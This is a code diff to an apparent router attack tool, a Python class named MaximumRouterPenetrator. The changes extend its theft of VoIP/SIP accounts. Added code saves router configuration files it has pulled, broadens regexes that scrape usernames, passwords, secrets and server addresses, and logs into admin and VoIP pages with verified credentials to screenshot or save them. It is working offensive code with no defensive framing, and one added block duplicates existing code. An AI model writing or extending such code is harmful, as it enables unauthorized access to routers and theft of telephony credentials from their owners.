@@ -1460,6 +1460,21 @@ class MaximumRouterPenetrator:
                             # Show first 200 characters
                             preview = content[:200].replace('\n', ' ').replace('\r', ' ')
                             print(f"         📄 Preview: {preview}...")
+                    
+                    # Save config file to disk (always save)
+                    try:
+                        safe_filename = filename.replace('/', '_').replace('\\', '_').replace(':', '_')
+                        if not safe_filename.endswith(('.xml', '.conf', '.asp', '.cgi')):
+                            safe_filename += '.txt'
+                        
+                        with open(safe_filename, 'w', encoding='utf-8') as f:
+                            f.write(content)
+                        
+                        if verbose:
+                            print(f"         💾 Config file saved: {safe_filename}")
+                    except Exception as e:
+                        if verbose:
+                            print(f"         ❌ Config file save error: {str(e)[:50]}")
                         
             # Look for SIP-related content
             sip_indicators = ['sip', 'voip', 'phone', 'account', 'password', 'username', 'server', 'proxy']
@@ -1475,26 +1490,38 @@ class MaximumRouterPenetrator:
                 # Look for SIP account patterns
                 import re
                 
-                # Pattern 1: Username/Password pairs
+                # Enhanced patterns for SIP extraction
                 username_patterns = [
-                    r'username["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'user["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'account["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'number["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                    r'username["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'user["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'account["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'number["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'voip_username["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'sip_username["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'phone_number["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'extension["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)'
                 ]
                 
                 password_patterns = [
-                    r'password["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'pass["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'secret["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                    r'password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'pass["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'secret["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'voip_password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'sip_password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'auth_password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'key["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)'
                 ]
                 
                 server_patterns = [
-                    r'server["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'registrar["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'proxy["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'host["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                    r'server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'registrar["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'proxy["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'host["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'voip_server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'sip_server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'registrar_server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'outbound_proxy["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)'
                 ]
                 
                 # Extract usernames
@@ -1566,26 +1593,38 @@ class MaximumRouterPenetrator:
                 # Look for SIP account patterns
                 import re
                 
-                # Pattern 1: Username/Password pairs
+                # Enhanced patterns for SIP extraction
                 username_patterns = [
-                    r'username["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'user["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'account["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'number["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                    r'username["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'user["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'account["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'number["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'voip_username["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'sip_username["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'phone_number["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'extension["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)'
                 ]
                 
                 password_patterns = [
-                    r'password["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'pass["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'secret["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                    r'password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'pass["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'secret["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'voip_password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'sip_password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'auth_password["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'key["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)'
                 ]
                 
                 server_patterns = [
-                    r'server["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'registrar["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'proxy["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
-                    r'host["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                    r'server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'registrar["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'proxy["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'host["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'voip_server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'sip_server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'registrar_server["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)',
+                    r'outbound_proxy["\']?\s*[:=]\s*["\']?([^"\'\s<>]+)'
                 ]
                 
                 # Extract usernames
@@ -2862,6 +2901,73 @@ class MaximumRouterPenetrator:
                                     if verbose:
                                         print(f"            ✅ VoIP screenshot from {path}: {voip_test['filename']}")
                                     break
+                    # Take screenshots immediately after verification
+                    if self.screenshot_mode:
+                        if verbose:
+                            print(f"            📸 LIVE DEBUG: Taking immediate screenshots after verification...")
+                        
+                        # Admin panel screenshot
+                        admin_screenshot = self._take_selenium_screenshot(
+                            ip, 
+                            "/admin/", 
+                            f"admin_panel_{ip}.png",
+                            (username, password),
+                            verbose
+                        )
+                        
+                        if admin_screenshot['success']:
+                            auth_result['admin_screenshot'] = admin_screenshot['filename']
+                            if verbose:
+                                print(f"            ✅ Admin panel screenshot: {admin_screenshot['filename']}")
+                        else:
+                            # Fallback to HTML save
+                            try:
+                                import base64
+                                auth_string = f'{username}:{password}'
+                                auth_bytes = auth_string.encode('ascii')
+                                auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+                                
+                                req = urllib.request.Request(f"http://{ip}/admin/")
+                                req.add_header('Authorization', f'Basic {auth_b64}')
+                                response = urllib.request.urlopen(req, timeout=10)
+                                
+                                html_filename = f"admin_panel_{ip}.html"
+                                with open(html_filename, 'w', encoding='utf-8') as f:
+                                    f.write(response.read().decode('utf-8', errors='ignore'))
+                                
+                                auth_result['admin_screenshot'] = html_filename
+                                if verbose:
+                                    print(f"            ✅ Admin panel HTML saved: {html_filename}")
+                            except Exception as e:
+                                if verbose:
+                                    print(f"            ❌ Screenshot fallback error: {str(e)[:50]}")
+                        
+                        # VoIP/SIP page screenshot
+                        voip_screenshot = self._take_selenium_screenshot(
+                            ip, 
+                            "/html/ssmp/voip/voip.asp", 
+                            f"voip_page_{ip}.png",
+                            (username, password),
+                            verbose
+                        )
+                        
+                        if voip_screenshot['success']:
+                            auth_result['voip_screenshot'] = voip_screenshot['filename']
+                            if verbose:
+                                print(f"            ✅ VoIP page screenshot: {voip_screenshot['filename']}")
+                        else:
+                            # Try other VoIP paths
+                            voip_paths = ["/admin/voip.asp", "/voip.html", "/sip.html", "/voice.html"]
+                            for path in voip_paths:
+                                voip_test = self._take_selenium_screenshot(
+                                    ip, path, f"voip_page_{ip}.png", (username, password), verbose
+                                )
+                                if voip_test['success']:
+                                    auth_result['voip_screenshot'] = voip_test['filename']
+                                    if verbose:
+                                        print(f"            ✅ VoIP screenshot from {path}: {voip_test['filename']}")
+                                    break
+                    
                     # Take screenshots immediately after verification
                     if self.screenshot_mode:
                         if verbose:
